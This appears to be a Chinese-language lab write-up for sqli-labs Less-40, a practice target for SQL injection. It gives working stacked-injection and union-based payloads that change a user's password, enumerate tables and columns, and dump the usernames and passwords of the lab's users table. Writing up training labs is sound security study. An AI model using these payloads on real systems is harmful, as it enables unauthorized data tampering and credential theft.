---
title: less40
url: https://www.yuque.com/u29002979/ep2zrx/uc0q7vn3flveo5x8
---

```bash
$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
/* execute multi query */
if (mysqli_multi_query($con1, $sql))
```

闭合方式为**')**。依旧存在堆叠注入 <a name="PPyxl"></a>

# 堆叠注入

利用堆叠注入，**修改**Dumb账户的密码&#x20;
`?id=1')**; update** security.users set password='xiugai' where username='Dumb'--+`

查询看是发现Dumb账户的密码变成了 'xiugai'
`?id=-1') union select 1,2,(select group_concat(username,0x7e,password)from users)--+`

> Your Username is : 2
> Your Password is : Dumb~xiugai,Angelina~I-kill-you,Dummy~p@ssword,secure~crappy,stupid~stupidity,superman~genious,batman~mob!le,admin~1234,admin1~admin1,admin2~admin2,admin3~admin3,dhakkan~dumbo,admin4~admin4,admin'-- +~123456

密码修改成功 <a name="bzYh1"></a>

# 注入点测试

`?id=1'`

`?id=1') or 1=('1`闭合
闭合方式是单引号加括号**')**

```bash
判断字段数 
?id=1') order by 4--+ 
?id=1') order by 3--+ 

找回显点
?id=-1') union select 1,2,3--+  

爆破数据库名称
?id=-1') union select 1,2,database()--+

爆破数据库表名称
?id=-1') union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+

爆破字段名称
?id=-1') union select 1,2,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='users'--+

爆破字段内容
?id=-1') union select 1,2,(select group_concat(username,0x7e,password) from users)--+
```
